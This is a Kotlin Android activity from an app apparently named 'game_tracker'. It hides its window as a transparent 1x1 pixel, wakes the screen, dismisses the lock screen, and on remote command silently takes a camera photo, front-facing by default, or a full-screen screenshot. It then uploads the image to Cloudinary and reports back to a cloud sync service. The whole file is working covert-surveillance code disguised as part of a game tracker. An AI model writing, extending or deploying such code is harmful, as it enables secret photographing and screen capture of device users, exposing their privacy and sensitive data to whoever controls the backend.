package com.example.game_tracker

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.util.Size
import android.view.Gravity
import android.view.WindowManager
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.atomic.AtomicBoolean

class InvisibleCaptureActivity : Activity() {

    companion object {
        private const val TAG = "InvisibleCaptureAct"
        private const val REQUEST_CODE_SCREEN_CAPTURE = 2001
    }

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var handlerThread: HandlerThread? = null
    private var bgHandler: Handler? = null
    private val isFinished = AtomicBoolean(false)
    private var currentRequestId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make window 1x1 pixel, completely invisible and non-intrusive
        try {
            window.addFlags(
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            )
            val params = window.attributes
            params.width = 1
            params.height = 1
            params.alpha = 0f
            window.attributes = params
            window.setGravity(Gravity.TOP or Gravity.START)
        } catch (e: Throwable) {
            e.printStackTrace()
        }

        val thread = HandlerThread("invisible_capture_thread")
        thread.start()
        handlerThread = thread
        bgHandler = Handler(thread.looper)

        val action = intent?.getStringExtra("action") ?: "camera_capture"
        val requestId = intent?.getStringExtra("requestId")
        val facing = intent?.getStringExtra("cameraFacing") ?: "front"
        currentRequestId = requestId

        // 10-second safety timeout to avoid hanging invisible activity
        Handler(Looper.getMainLooper()).postDelayed({
            if (isFinished.compareAndSet(false, true)) {
                Log.w(TAG, "Invisible capture activity timed out, finishing")
                cleanupAndFinish()
            }
        }, 10000)

        when (action) {
            "camera_capture" -> executeCameraCapture(facing, requestId)
            "screenshot" -> executeScreenCapture(requestId)
            else -> cleanupAndFinish()
        }
    }

    private fun executeCameraCapture(facing: String, requestId: String?) {
        try {
            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                try {
                    val chars = manager.getCameraCharacteristics(id)
                    val lens = chars.get(CameraCharacteristics.LENS_FACING)
                    if (facing == "back") lens == CameraCharacteristics.LENS_FACING_BACK
                    else lens == CameraCharacteristics.LENS_FACING_FRONT
                } catch (_: Throwable) {
                    false
                }
            } ?: manager.cameraIdList.firstOrNull()

            if (cameraId == null) {
                markFailed(requestId, "No camera device available")
                cleanupAndFinish()
                return
            }

            val chars = manager.getCameraCharacteristics(cameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
            val chosen = sizes?.firstOrNull { it.width <= 1920 && it.height <= 1080 }
                ?: sizes?.firstOrNull()
                ?: Size(1280, 720)

            imageReader = ImageReader.newInstance(chosen.width, chosen.height, ImageFormat.JPEG, 2)
            imageReader?.setOnImageAvailableListener({ reader ->
                if (!isFinished.compareAndSet(false, true)) return@setOnImageAvailableListener
                val image = reader.acquireLatestImage()
                if (image == null) {
                    markFailed(requestId, "Acquired camera image is null")
                    cleanupAndFinish()
                    return@setOnImageAvailableListener
                }

                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val tempFile = File.createTempFile("inv_cam_", ".jpg", cacheDir)
                    FileOutputStream(tempFile).use { fos ->
                        fos.write(bytes)
                        fos.flush()
                    }

                    if (!requestId.isNullOrEmpty()) {
                        CloudinaryUploader.uploadFile(tempFile) { uploadedUrl, error ->
                            if (!uploadedUrl.isNullOrEmpty()) {
                                CloudBridgeSync.updateRequestStatus(
                                    requestId = requestId,
                                    status = "completed",
                                    screenshotUrl = uploadedUrl
                                )
                            } else {
                                markFailed(requestId, error ?: "Upload failed")
                            }
                            cleanupAndFinish()
                        }
                    } else {
                        cleanupAndFinish()
                    }
                } catch (e: Throwable) {
                    markFailed(requestId, "Image processing error: ${e.message}")
                    cleanupAndFinish()
                }
            }, bgHandler)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    cameraDevice = device
                    try {
                        val surface = imageReader?.surface
                        if (surface == null) {
                            markFailed(requestId, "Image surface is null")
                            cleanupAndFinish()
                            return
                        }
                        val targets = listOf(surface)
                        @Suppress("DEPRECATION")
                        device.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                try {
                                    val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }
                                    session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {}, bgHandler)
                                } catch (e: Throwable) {
                                    markFailed(requestId, "Capture request failed: ${e.message}")
                                    cleanupAndFinish()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                markFailed(requestId, "Capture session configuration failed")
                                cleanupAndFinish()
                            }
                        }, bgHandler)
                    } catch (e: Throwable) {
                        markFailed(requestId, "Session creation error: ${e.message}")
                        cleanupAndFinish()
                    }
                }

                override fun onDisconnected(device: CameraDevice) {
                    device.close()
                    markFailed(requestId, "Camera disconnected")
                    cleanupAndFinish()
                }

                override fun onError(device: CameraDevice, error: Int) {
                    device.close()
                    markFailed(requestId, "Camera hardware error: $error")
                    cleanupAndFinish()
                }
            }, bgHandler)
        } catch (e: Throwable) {
            markFailed(requestId, "Camera open failed: ${e.message}")
            cleanupAndFinish()
        }
    }

    private fun executeScreenCapture(requestId: String?) {
        val proj = MediaProjectionStore.getOrCreateMediaProjection(this)
        if (proj != null) {
            captureScreenWithProjection(proj, requestId)
        } else {
            // Prompt MediaProjectionManager in this activity context
            try {
                val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE)
            } catch (e: Throwable) {
                markFailed(requestId, "Screen capture permission initiation error: ${e.message}")
                cleanupAndFinish()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                MediaProjectionStore.save(this, resultCode, data)
                val proj = MediaProjectionStore.getOrCreateMediaProjection(this)
                if (proj != null) {
                    captureScreenWithProjection(proj, currentRequestId)
                } else {
                    markFailed(currentRequestId, "Failed to instantiate MediaProjection from intent")
                    cleanupAndFinish()
                }
            } else {
                markFailed(currentRequestId, "Screen capture permission declined")
                cleanupAndFinish()
            }
        }
    }

    private fun captureScreenWithProjection(projection: MediaProjection, requestId: String?) {
        try {
            // Android 14/15 requires registerCallback before createVirtualDisplay
            try {
                projection.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        super.onStop()
                        Log.d(TAG, "MediaProjection stopped by system")
                        MediaProjectionStore.activeMediaProjection = null
                    }
                }, bgHandler)
            } catch (cbErr: Throwable) {
                Log.w(TAG, "MediaProjection.registerCallback warning: ${cbErr.message}")
            }

            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(metrics)
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            imageReader = reader

            virtualDisplay = projection.createVirtualDisplay(
                "inv_screencap",
                width,
                height,
                density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface,
                null,
                bgHandler
            )

            reader.setOnImageAvailableListener({ r ->
                if (!isFinished.compareAndSet(false, true)) return@setOnImageAvailableListener
                val image = r.acquireLatestImage()
                if (image == null) {
                    markFailed(requestId, "Null screen image acquired")
                    cleanupAndFinish()
                    return@setOnImageAvailableListener
                }

                try {
                    val plane = image.planes[0]
                    val buffer = plane.buffer
                    val pixelStride = plane.pixelStride
                    val rowStride = plane.rowStride
                    val rowPadding = rowStride - pixelStride * width

                    val bmp = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buffer)
                    image.close()

                    val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
                    val tempFile = File.createTempFile("inv_screen_", ".png", cacheDir)
                    FileOutputStream(tempFile).use { fos ->
                        cropped.compress(Bitmap.CompressFormat.PNG, 90, fos)
                        fos.flush()
                    }

                    if (!requestId.isNullOrEmpty()) {
                        CloudinaryUploader.uploadFile(tempFile) { uploadedUrl, error ->
                            if (!uploadedUrl.isNullOrEmpty()) {
                                CloudBridgeSync.updateRequestStatus(
                                    requestId = requestId,
                                    status = "completed",
                                    screenshotUrl = uploadedUrl
                                )
                            } else {
                                markFailed(requestId, error ?: "Upload failed")
                            }
                            cleanupAndFinish()
                        }
                    } else {
                        cleanupAndFinish()
                    }
                } catch (e: Throwable) {
                    markFailed(requestId, "Screen frame processing error: ${e.message}")
                    cleanupAndFinish()
                }
            }, bgHandler)
        } catch (e: Throwable) {
            markFailed(requestId, "VirtualDisplay creation error: ${e.message}")
            cleanupAndFinish()
        }
    }

    private fun markFailed(requestId: String?, reason: String) {
        if (!requestId.isNullOrEmpty()) {
            CloudBridgeSync.updateRequestStatus(
                requestId = requestId,
                status = "failed",
                error = reason,
                failureReason = reason
            )
        }
    }

    private fun cleanupAndFinish() {
        try {
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
            handlerThread?.quitSafely()
            handlerThread = null
        } catch (_: Throwable) {}
        runOnUiThread {
            finishAndRemoveTask()
        }
    }

    override fun onDestroy() {
        cleanupAndFinish()
        super.onDestroy()
    }
}
